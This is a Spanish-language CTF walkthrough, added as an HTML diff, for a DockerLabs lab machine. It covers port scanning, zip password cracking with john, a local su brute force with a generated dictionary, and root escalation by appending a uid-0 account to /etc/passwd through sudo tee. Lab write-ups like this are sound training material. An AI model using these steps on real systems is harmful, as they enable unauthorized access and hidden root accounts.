@@ -1,0 +1,136 @@
+<p><img src="assets/bash/portada.png" alt="portada" /></p>
+
+<p>En este reto de <a href="https://dockerlabs.es" title="DockerLabs">DockerLabs</a> aprendemos.</p>
+
+<ul>
+  <li>Scan de puertos</li>
+  <li>Bash scripting basico</li>
+  <li>Abuso de sudo</li>
+</ul>
+
+<h2 id="herramientas-y-recursos">Herramientas y recursos</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>Bucles for</li>
+  <li><a href="https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh" title="Mario Github">Mario</a></li>
+  <li>Password cracking john zip2john</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeracion">Reconocimiento y enumeracion</h2>
+
+<p>Lo primero como siempre le tiramos un nmap con los parámetros de costumbre.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oX</span> bashpariencias 172.18.0.2
+</code></pre></div></div>
+
+<p><a href="/reporte/bashpariencias.html">reporte</a></p>
+
+<p>Como observamos en el reporte no encontramos con el puerto 80 y un servidor ssh  corriendo en el 8899 con una versión la cual podríamos explotar.</p>
+
+<p>Empiezo por lo mas fácil que es revisar la web del tirón ya me indica algo prometedor pues habla una usuaria con poca experiencia.</p>
+
+<p><img src="assets/bash/infopassrosa.png" alt="infopass" /></p>
+
+<p>Revisando bien toda la web puedo ver que existe una pequeña fuga del nombre de dicha usuaria.</p>
+
+<p><img src="assets/bash/rosacajon.png" alt="rosacajon" /></p>
+
+<p>Ahora me fijo directo a ese código.</p>
+
+<p><img src="assets/bash/code.png" alt="code" /></p>
+
+<p>Tenemos la password de rosa.</p>
+
+<p>Hacemos login por ssh</p>
+
+<h2 id="intrusion">Intrusion</h2>
+
+<p>Una vez logueados con rosa vemos una carpeta en su directorio personal.</p>
+
+<p><img src="assets/bash/guion.png" alt="guion" /></p>
+
+<p>Si nos fijamos es un directorio con un guion por nombre.</p>
+
+<p><img src="assets/bash/mesaje.png" alt="mensaj" /></p>
+
+<p>En el mensaje queda claro como seguir, debemos cracker el archivo zip para obtener la contraseña.
+Primero nos lo transferimos a nuestra maquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 9000
+zip2john ../../../backup_rosa.zip <span class="o">&gt;</span> zip.hash
+john zip.hash
+</code></pre></div></div>
+<p><img src="assets/bash/passzip.png" alt="passzip" /></p>
+
+<p><img src="assets/bash/passwextracted.png" alt="passjuan" /></p>
+
+<p>Por otro lado el mensaje queda algo confuso porque nos dice que lo capturemos cuando en realidad lo que vemos es un archivo .zip y debemos crackearlo con john.</p>
+
+<p>Tratemos de ver los procesos que corren……</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps <span class="nt">-auxf</span>
+</code></pre></div></div>
+
+<p><img src="assets/bash/ps.png" alt="ps" /></p>
+
+<p>Vemos que hay un proceso con nombre pass_juan.sh , nos lleva a pensar que esta guardando la contraseña en algún lugar y solo puede ser donde tengamos permisos de escritura en home de rosa que no hay nada , en /tmp o /opt , eso serian los directorios comunes.</p>
+
+<p>Lanzamos y probamos un bucle por si hay suerte.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="o">((</span> <span class="p">;</span> <span class="p">;</span> <span class="o">))</span> <span class="p">;</span> <span class="k">do </span><span class="nb">cp</span> /tmp/<span class="k">*</span>.txt /home/rosa <span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<p>Tenemos suerte en tmp y nos copia un archivo con el mismo pass que obtuvimos del zip.</p>
+
+<h2 id="movimiento-lateral">Movimiento lateral</h2>
+
+<p>Ahora nos convertimos en juan.</p>
+
+<p>Como juan vemos que tenemos permisos de sudo en dos binarios tree y cat por tanto ya sabemos que lo que hemos de buscar esta bajo algún directorio de Carlos.</p>
+
+<p><img src="assets/bash/options.png" alt="options" /></p>
+
+<p>Como vemos nos ocurre lo mismo de antes tenemos dos opciones una mas fácil y otra con la que hemos de hacer uso de un poco de bash scripting.</p>
+
+<p>Visto que tenemos la pass a la vista practiquemos con bash no seamos de los que acudían al rincón del vago en tiempos antiguos.</p>
+
+<p>El mensaje nos dice que olvido lo tres últimos caracteres de su pass , entonces podemos crear otro pequeño bucle de for concatenando letras del abecedario y posteriormente hacer una de dos u otro bucle con while o for probando contra carlos o hacer uso del script que hizo Mario que viene genial para fuerza bruta local en linux.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">palabra</span><span class="o">=</span>chocolate
+
+<span class="k">for </span>c1 <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do
+	for </span>c2 <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do
+		for </span>c3 <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do
+			</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$palabra</span><span class="k">${</span><span class="nv">c1</span><span class="k">}${</span><span class="nv">c2</span><span class="k">}${</span><span class="nv">c3</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;&gt;</span>dict2.txt
+		<span class="k">done
+	done
+done</span> 
+</code></pre></div></div>
+
+<p>Ahí creamos el diccionario personalizado para la ocasión.
+Ahora nos faltaría el script para ello lo mas sencillo ir a su github copiarlo y aprovechar  que tenemos nano y pegarlo ahí mismo.
+Entre el dic creado y el script de Mario resolvemos el problema.</p>
+
+<p><img src="assets/bash/passsu.png" alt="passu" /></p>
+
+<p>Podemos convertirnos en carlos y vemos que tiene permisos de root con el binario tee.</p>
+
+<h2 id="escalada-final">Escalada final</h2>
+
+<p>Así que tratamos de crear una nueva entrada para el fichero <strong>etc/passwd</strong></p>
+
+<p>1ªCreamosa la pass para el usuario</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> <span class="s2">"firstatack"</span> <span class="s2">"pass"</span>
+</code></pre></div></div>
+<p>2ª La pegamos al fichero</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s1">'firstatack:$1$firstata$KaJwXv0namG9OzwTOxpN61:0:0:root:/root:/bin/bash\n'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/passwd
+</code></pre></div></div>
+<p>3ª- Hacemos login con el usuario creado.</p>
+
+<p><img src="assets/bash/root.png" alt="root" /></p>
+
+<p>Gracias por leer</p>
+
